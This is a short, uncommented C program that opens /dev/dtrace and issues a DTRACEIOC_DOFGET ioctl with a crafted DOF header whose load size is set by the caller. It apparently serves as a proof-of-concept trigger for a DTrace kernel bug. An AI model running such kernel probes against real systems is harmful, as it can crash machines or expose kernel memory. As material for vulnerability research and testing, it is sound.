#include <errno.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <stdlib.h>
#include <stdio.h>

#include <sys/dtrace.h>

int main(){
	int fd;
	dof_hdr_t *dofin;

	dofin = (dof_hdr_t *)malloc(0x100+sizeof(dof_hdr_t));
	memset(dofin, 0, 0x100+sizeof(dof_hdr_t));
	dofin->dofh_loadsz = 0x100 + sizeof(dof_hdr_t);

	fd = open("/dev/dtrace", O_RDONLY);
	
	if(fd < 0){
		perror("open dtrace");
		exit(0);
	}

	if(ioctl(fd, DTRACEIOC_DOFGET, dofin) < 0){
		perror("ioctl");
	}
}
